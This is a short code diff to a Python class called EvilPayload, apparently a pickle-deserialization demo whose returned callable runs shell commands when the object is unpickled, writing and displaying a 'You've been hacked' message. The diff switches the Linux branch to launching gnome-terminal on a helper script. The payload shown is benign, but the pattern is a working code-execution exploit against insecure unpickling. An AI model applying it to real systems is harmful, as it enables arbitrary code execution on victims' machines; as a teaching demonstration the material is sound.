@@ -45,8 +45,10 @@ class EvilPayload:
         os.system("echo You've been hacked by Evil Pickle!!! > evil_msg.txt")
 
         if platform.system() == 'Linux':
-            get_subprocess('run_evil_msg_for_ubuntu.py')
-            return print, ("You've been hacked by Evil Pickle!!!", )
+            PYTHON_PATH = sys.executable
+            BASE_PATH = os.path.dirname(os.path.abspath(__file__))
+            file_full_path = f"{PYTHON_PATH} {BASE_PATH}/run_evil_msg_for_ubuntu.py"
+            return subprocess.Popen, (("gnome-terminal", "--", "bash", "-c", file_full_path),)
 
         return subprocess.Popen, (('notepad', 'evil_msg.txt'),)
  
